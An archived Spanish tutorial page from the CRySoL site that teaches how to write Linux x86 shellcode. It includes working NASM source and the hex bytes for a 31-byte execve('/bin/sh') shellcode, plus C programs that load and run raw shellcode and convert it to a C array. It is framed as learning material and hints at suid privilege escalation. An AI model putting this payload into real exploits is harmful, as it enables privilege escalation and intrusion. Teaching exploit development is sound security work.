
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Hacking serio básico: Introducción a los "shellcodes" (I)</title>
    
    <meta name="author" content="CRySoL">

    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js" type="text/javascript"></script>
    <script src="/javascripts/main.js"></script>

    <!-- Enable responsive viewport -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
    <!--[if lt IE 9]>
      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <!-- Le styles -->
    <link href="/assets/themes/twitter/bootstrap/css/bootstrap.2.2.2.min.css" rel="stylesheet">
    <link href="/assets/themes/twitter/css/style.css?body=1" rel="stylesheet" type="text/css" media="all">
    <link href="/stylesheets/pygment_trac.css" rel="stylesheet" type="text/css" media="all">

    <!-- Le fav and touch icons -->
  <!-- Update these with your own images
    <link rel="shortcut icon" href="images/favicon.ico">
    <link rel="apple-touch-icon" href="images/apple-touch-icon.png">
    <link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
  -->

    <!-- atom & rss feed -->
    <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="Sitewide ATOM Feed">
    <link href="/rss.xml" type="application/rss+xml" rel="alternate" title="Sitewide RSS Feed">

    

  </head>

  <body>
    <div class="navbar navbar-fixed-top">
      <div class="navbar-inner">
        <div class="container-narrow">
<!--
	  <a class="brand-image" href="/"><img class="brand-image" src="/assets/themes/twitter/logo.png"/></a>
-->
          <a class="brand" href="/">CRySoL</a>
          <ul class="nav">
            
            
            


  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
      
    
  
    
      
      	
      	<li><a href="/recipes.html">Recipes</a></li>
      	
      
    
  
    
      
      	
      	<li><a href="/about.html">About</a></li>
      	
      
    
  
    
      
    
  
    
      
    
  
    
  
    
      
    
  
    
      
      	
      	<li><a href="/archive.html">Archive</a></li>
      	
      
    
  
    
  
    
      
    
  
    
      
      	
      	<li><a href="/users.html">Users</a></li>
      	
      
    
  
    
      
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  



          </ul>
        </div>
      </div>
    </div>

    <div class="container-narrow">

      <div class="row-fluid">
	<div class="content">
          
<div class="sidebar span3">
  <div id="logo">
  <a href="/">
    <img src="/assets/images/logo.png" alt="logo"/>
  </a>
</div>

  <div class="metadata">
  <h2>this</h2>
  <ul>
    
      <li>author: 
  <a href="/users.html#brue">
   brue
  </a>


        
        <span class="author-photo">

  <img src="http://www.gravatar.com/avatar/aac4252291c3d7988a91cd89c4e07fd9?s=48" alt="gravatar"/>

</span>

      </li>
      
    

    <li>created: 2007-01-09 </li>

    <li><a href="https://github.com/CRySoL/web.source/raw/master/_posts/migrated/2007-01-09-hacking-serio-bsico-introduccin-a-los-shellcodes-i.textile">source / <a href="https://github.com/CRySoL/web.source/edit/master/_posts/migrated/2007-01-09-hacking-serio-bsico-introduccin-a-los-shellcodes-i.textile">edit</a></li>

  
    <li>categories:
    
      <a href="/categories.html#recipe-ref">recipe</a>
    
    </li>
  

  
      <li>migrated&nbsp;from&nbsp;<a href="http://crysol.org/node/493">node/493</a></li>
  

  
    <li>tags:
    
      <a href="/tags.html#security-ref">security</a>
    
    </li>
  
  </ul>

  
     
     
  

  
     
     
     <a class="tag-icon" href="/tags.html#security-ref">
        <img src="http://crysol.org/files/category_pictures/seguridad_taxonomy.png" title="security" alt="security-icon"/>
     </a>
     
  

  <!-- AddThis Button BEGIN -->
<div class="share addthis_toolbox addthis_default_style addthis_16x16_style">
<a class="addthis_button_google_plusone_share"></a>
<a class="addthis_button_twitter"></a>
<a class="addthis_button_facebook"></a>
<a class="addthis_button_compact"></a><a class="addthis_counter addthis_bubble_style"></a>
</div>
<script type="text/javascript">var addthis_config = {"data_track_addressbar":true};</script>
<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-51cdd0d57c014017"></script>
<!-- AddThis Button END -->

</div>

<div class="related">
  <h2>related</h2>
  <ul>
    
    <li><a href="/recipe/2005-09-13/ssh-y-scp-para-acceder-a-equipos-remotos-sin-escribir-la-clave-public-key-authentication">SSH y SCP para acceder a equipos remotos sin escribir la clave (public key authentication)</a></li>
    
    <li><a href="/2005-09-24/acabo-de-registrarme-en-el-portal">Acabo de registrarme en el Portal</a></li>
    
    <li><a href="/2005-09-26/buenas-a-tods">Buenas a tod@s!</a></li>
    
    <li><a href="/tale/2005-09-26/instalacin-local-de-mambo-joomla-bajo-gnu-linux">Instalación local de Mambo / Joomla bajo GNU/Linux</a></li>
    
    <li><a href="/recipe/2005-09-27/acceso-a-red-cmpus-con-firefox-y-greasemonkey">Acceso a Red C@mpus con Firefox y Greasemonkey</a></li>
    
  </ul>
</div>

<div class="recent">
  <h2>recent</h2>
  <ul>
  
    <li><a href="/recipe/2013-10-12/apt-pinning">Debian apt pinning</a></li>
  
    <li><a href="/recipe/2013-10-10/change-primary-monitor">Changing primary monitor</a></li>
  
    <li><a href="/recipe/2013-10-05/virtualbox-import-export-clone">VirtualBox: import/export and cloning machines</a></li>
  
    <li><a href="/recipe/2013-09-23/virtualbox-vmdk-to-vdi">Converting .vmdk virtual disk to .vdi format from command line</a></li>
  
    <li><a href="/recipe/2013-09-19/ice35-deb-packages-from-zeroc">Installing the Ice-3.5 packages from ZeroC on Debian</a></li>
  
  </ul>
</div>

</div>

<div class="node span9">
  <div class="page-header">
    <h1>Hacking serio básico: Introducción a los "shellcodes" (I) </h1>
  </div>

  <div class="row-fluid post-full">
    <div class="span12">
      <div class="content">
	<p>Cómo programar una shell code para utilizar en tus xploits (Parte 1)</p>
<p><!--break--></p>
<h2>Introducción</h2>
<p>Cuando se produce un overflow en un programa, podemos sobreescribir <span class="caps">EIP</span> &#8220;Instruction Pointer&#8221; (entre otras cosas). Si sobreescribimos este registro con una dirección que contiene código propio, se ejecutará. Esto es, podemos ejecutar código con los permisos que tiene el programa ejecutado. ¿Qué pasa si el programa tiene el bit de suid activado? Lo dejo a vuestra imaginación.</p>
<p>Encontrar este tipo de xploits es muy difícil hoy en dia, puesto que hay muchas herramientas de análisis de código que evitan que se produzcan tremendos errores de seguridad. Aun así, podemos encontrar o programar algo a medida simplemente para aumentar conocimientos, que es en lo que consiste la curiosidad (lo otro se llama &#8216;prensa rosa&#8217;).</p>
<h2>Nasm &#8211; Ensamblador tipo intel para x86</h2>
<p><span class="caps">NASM</span> es un ensamblador libre de tipo intel. Lo he elegido porque es con lo que yo estoy familiarizado.</p>
<p>Como siempre, los que tengan debian o similares:</p>
<div class="console">
<div class="highlight"><pre><code class="console"><span class="gp">#</span> apt-get install nasm
</code></pre></div></div>
<h2>Linux System Calls</h2>
<p>Las llamadas a sistema en Linux se hacen con parámetros en los registros e invocando la interrupción 80h.</p>
<p>Un ejemplo sería:</p>
<div>
<div class="highlight"><pre><code class="text">mov eax,1     ; eax = 1 =&gt; exit syscall
xor ebx,ebx   ; ebx = 0 =&gt; ebx = int
int 0x80      ; Ejecutar syscall
</code></pre></div></div>
<p>Podéis consultar una tabla de syscalls <a href="http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html">aquí</a></p>
<h2>Ejemplo clásico: ejecutar una shell (/bin/sh)</h2>
<p>Para ejecutar una shell tenemos que tener en cuenta que debemos administrar un parámetro de cadena, esto es &#8220;/bin/sh&#8221; a la función syscall correspondiente. Pero, ¿cómo hacemos esto si no sabemos en qué parte de la memoria irá nuestra shellcode? Mmmm&#8230; difícil a primera vista.</p>
<p>Bien, existe un truco. Cuando se realiza un &#8220;call&#8221;, la cima de la pila contiene la siguiente dirección de memoria que va tras ella, así, al hacer &#8220;ret&#8221;, se podrá apuntar el PC (contador de programa) a esa dirección y seguir con el código del programa. Así que &#8230; con estos datos sabemos que la siguiente dirección de memoria tras un &#8220;call&#8221; podemos conseguirla de la pila con &#8220;pop <registro>&#8221;. Bien, si tras ese &#8220;call&#8221; ponemos datos, ya tenemos la forma de apuntar a ellos.</p>
<p>Ejemplo:</p>
<div>
<div class="highlight"><pre><code class="text">BITS 32

 jmp short datos

código:

 pop esi   ; char [ESI]   = &#39;c&#39;
           ; char [ESI+1] = &#39;a&#39;
           ; char [ESI+2] = &#39;d&#39;
           ; ...
           ; char [ESI+5] = &#39;a&#39;

datos:
 call codigo

db &#39;cadena&#39;
</code></pre></div></div>
<p>Al final de nuestra variable cadena debería haber un caracter nulo &#8216;\0&#8217; , pero las shellcodes no se llevan muy bien ni con ellos, ni con los retornos de carro y algunas cosas más; así que tenemos que añadirlo nosotros.<br />
Cuidado con operaciones que tengan 0&#8217;s. Hacer &#8220;mov eax, 0&#8221; hará que el binario compilado contenga caracteres &#8216;\0&#8217;.<br />
Recordad que para poner algo a 0 basta con hacer un <span class="caps">XOR</span> consigo mismo.</p>
<div>
<div class="highlight"><pre><code class="text">BITS 32

 jmp short datos:
codigo:
 pop esi
 xor eax, eax          ; EAX = 0 (EAX/AX/AH/AL)
 mov byte [esi+7], al  ; Cambiamos &#39;#&#39; por &#39;0&#39;

datos:
 call codigo

db &#39;/bin/sh#&#39;   ; Termina en &#39;#&#39; para reservar la memoria del &#39;\0&#39;
</code></pre></div></div>
<p>Vale. Ahora, miramos en la tabla de syscalls y vemos que sys_execve es la 11.<br />
La implementación en C es la siguiente:</p>
<div>
<div class="highlight"><pre><code class="text">int execve (const char *filename, char *const argv [], char *const envp[]);
</code></pre></div></div>
<p>Así que necesitamos tres punteros a los argumentos. El primer puntero ya sabemos cómo conseguirlo, el segundo, <span class="caps">NULL</span>, no queremos argumentos y en la opción de envp le metemos un <span class="caps">NULL</span>, que no nos hace falta para nada. Así la llamada a la syscall execve tendra a eax=11 (0xb), ebx = dirección donde empieza &#8216;/bin/sh&#8217;, ecx = <span class="caps">NULL</span> y edx = <span class="caps">NULL</span>.</p>
<p>Más o menos quedaría así:</p>
<div>
<div class="highlight"><pre><code class="text">BITS 32        ; Máquina de 32 bits - las shellcodes son específicas


 jmp short datos
codigo:
 pop esi
 xor eax, eax          ; EAX = 0 (EAX/AX/AH/AL)
 mov byte [esi+7], al  ; Cambiamos &#39;#&#39; por &#39;0&#39;
 mov al,11             ; syscall 11
 mov ebx, esi          ; ebx apunta a &#39;/bin/sh\0&#39;
 xor ecx,ecx           ; ecx = 0 NULL
 xor edx,edx           ; edx = 0 NULL
 int 0x80              ; syscall!

datos:
 call codigo

db &#39;/bin/sh#&#39;
</code></pre></div></div>
<p>Esto lo grabamos por ejemplo a un archivito llamador &#8220;exec.asm&#8221; y ejecutamos:</p>
<div class="console">
<div class="highlight"><pre><code class="console"><span class="gp">$</span> nasm -o <span class="nb">exec </span>exec.asm
</code></pre></div></div>
<p>Ahora se ha generado un archivito llamado &#8220;exec&#8221;. Ese archivo binario es nuestra shellcode!!! Pero, ¿cómo la probamos? No se puede ejecutar sin más, pues no es un elf, ni tiene ningún formato de ejecutable, es código máquina puro y duro.</p>
<h2>Probando la shellcode</h2>
<p>Para probarla podemos usar el siguiente programita en C. Su uso es:</p>
<div class="console">
<div class="highlight"><pre><code class="console"><span class="gp">$</span> gcc -o testshell testshell.c
<span class="gp">$</span> ./testshell <span class="nb">exec</span> <span class="o">(</span>u otro fichero bin generado por nasm<span class="o">)</span>
</code></pre></div></div>
<p>El programita que carga el fichero como función es:</p>
<div>
<div class="highlight"><pre><code class="text">/* Coded by brue - brue.org - testshell.c */
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#define MAX_SIZE 1000

int main(int argc, char** argv){

  FILE* f;
  int   b, c=0;
  char*  m;
  void  (*func)(void);


  if (argc&lt;2){
    printf(&quot;Use: %s &lt;file&gt;\n&quot;,argv[0]);
    return 1;
  }

  f = fopen(argv[1],&quot;r&quot;);
  if (f){
    m = malloc(MAX_SIZE);
    while((b=fgetc(f))!=EOF){
      *(m+c)=b;
      if ((c++)==MAX_SIZE) return 3;
    }
    fclose(f);
    printf(&quot;Executing...\n&quot;);
    func = (void (*)(void)) m;
    (*func)();
    return 0;
  }
  else{
    printf(&quot;Error opening: %s\n&quot;,argv[1]);
    return 2;
  }
}
</code></pre></div></div>
<p>Así que cuando ejecutamos el comando obtenemos:</p>
<div class="console">
<div class="highlight"><pre><code class="console"><span class="gp">$</span> ./testshell <span class="nb">exec</span>
<span class="go">Executing...</span>
<span class="gp">$</span>
</code></pre></div></div>
<p>&#8230;carga la shell sh!!! Funciona!!! (con ctrl-d podemos retornar a nuestra shell original).</p>
<p>Hemos hecho un binario en código máquina que ejecuta una shell en un linux x86 en tan sólo 31 bytes.</p>
<p>Ahora que tenemos esto, ¿cómo lo usamos en nuestro exploit? Vamos a verlo, con un ejemplo de uso en el lenguaje de sistemas C.</p>
<h2>Cómo usar el archivo compilado en nuestro código en C</h2>
<p>Una vez que tenemos nuestro archivo binario creado por nasm podéis usar el siguiente programita en C para convertir vuestra shell en una variable de C. Para compilarlo haremos:</p>
<div class="console">
<div class="highlight"><pre><code class="console"><span class="gp">$</span> gcc -o hex2c hex2c.c
</code></pre></div></div>
<p>Para usarlo:</p>
<div class="console">
<div class="highlight"><pre><code class="console"><span class="gp">$</span> ./hex2c <span class="nb">exec</span> <span class="o">(</span>o nombre del binario<span class="o">)</span>
</code></pre></div></div>
<p>Como salida nos encontramos:</p>
<div class="console">
<div class="highlight"><pre><code class="console"><span class="gp">$</span> brue@doppler:~/svn/brue/personal/hack/shcode<span class="nv">$ </span>./hex2c <span class="nb">exec</span>

<span class="go">char shell[]=</span>
<span class="go">&quot;\xeb\x10\x5e\x31\xc0&quot;</span>
<span class="go">&quot;\x88\x46\x07\xb0\x0b&quot;</span>
<span class="go">&quot;\x89\xf3\x31\xc9\x31&quot;</span>
<span class="go">&quot;\xd2\xcd\x80\xe8\xeb&quot;</span>
<span class="go">&quot;\xff\xff\xff\x2f\x62&quot;</span>
<span class="go">&quot;\x69\x6e\x2f\x73\x68&quot;</span>
<span class="go">&quot;\x23&quot;;</span>

<span class="go">31 bytes shellcode!</span>
</code></pre></div></div>
<p>Esta variable la podremos usar como shell code en nuestro exploit &#8230; pero eso ya es otra receta.</p>
<div>
<div class="highlight"><pre><code class="text">/* Coded by brue - brue.org - hex2c.c   *
 *                                      *
 * Compile with &#39;gcc -o hex2c hex2c.c&#39;  */

#include &lt;stdio.h&gt;


int main(int argc ,char** argv){

  FILE* f;
  int  b;
  int cont=0;

  if (argc&lt;2){
    printf(&quot;Use: %s &lt;file&gt;\n&quot;,argv[0]);
    return 1;
  }

  f = fopen(argv[1],&quot;r&quot;);
  if (f){
    printf(&quot;\n&quot;);
    printf(&quot;char shell[]=\n\&quot;&quot;);
    while((b=fgetc(f))!=EOF){
      cont++;
      printf(&quot;\\x%02x&quot;,(char*) b);
      if ((cont%5)==0){
	printf(&quot;\&quot;\n\&quot;&quot;);
      }
    }
    printf(&quot;\&quot;;\n\n&quot;);
    printf(&quot;%d bytes shellcode!\n&quot;,cont);
    fclose(f);
  }
  else{
    printf(&quot;Error opening: %s\n&quot;,argv[1]);
    return 2;
  }

  return 0;
}
</code></pre></div></div>
<p>Esta receta es sólo una introducción y pretende ser guía para algún curioso que pare por aquí. No es ejemplo del mejor C, ni del mejor asm x86&#8230;</p>
<h2>Enlaces</h2>
<p><a href="http://">Safemode.org</a><a href="http://www.safemode.org/files/zillion/shellcode/doc/Writing_shellcode.html">www.safemode.org/files/zillion/shellcode/doc/Writing_shellcode.html</a><br />
<a href="http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html">Linux System Calls Table</a><br />
<a href="http://nasm.sourceforge.net"><span class="caps">NASM</span></a></p>
      </div>

      

      <hr/>

      <div class="pagination pagination-centered">
  <ul>
    
      <li class="prev"><a href="/recipe/2007-01-08/control-del-puerto-paralelo-con-ppdev" title="Control del puerto paralelo con ppdev">&larr; Previous</a></li>
    

    <li><a href="/archive.html">Archive</a></li>

    
      <li class="next"><a href="/recipe/2007-01-09/servidor-tftp-con-inetd-en-debian" title="Servidor TFTP con inetd en Debian">Next &rarr;</a></li>
    
  </ul>
</div>


      <hr/>

      

<div id="show_comments"> [ <a onclick="show_comments();"> show comments </a> ] </div>


  <div id="disqus_thread"></div>
<script type="text/javascript">
    var disqus_developer = 1;
    var disqus_shortname = 'crysol'; // required: replace example with your forum shortname
    
    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = 'http://' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>






    </div>
  </div>
</div>


	</div>
      </div>

      <hr/>

      <footer>
        <p>&copy; 2013 CRySoL
          with help from <a href="http://jekyllbootstrap.com" target="_blank" title="The Definitive Jekyll Blogging Framework">Jekyll Bootstrap</a>
          and <a href="http://twitter.github.com/bootstrap/" target="_blank">Twitter Bootstrap</a>.
	  See <a href="https://github.com/CRySoL/web.source" target="_blank">site sources</a>.
	  <br/>
	  Generated at Sat Oct 12 23:50:23 +0200 2013
	</p>
      </footer>

    </div>

    
  </body>
</html>

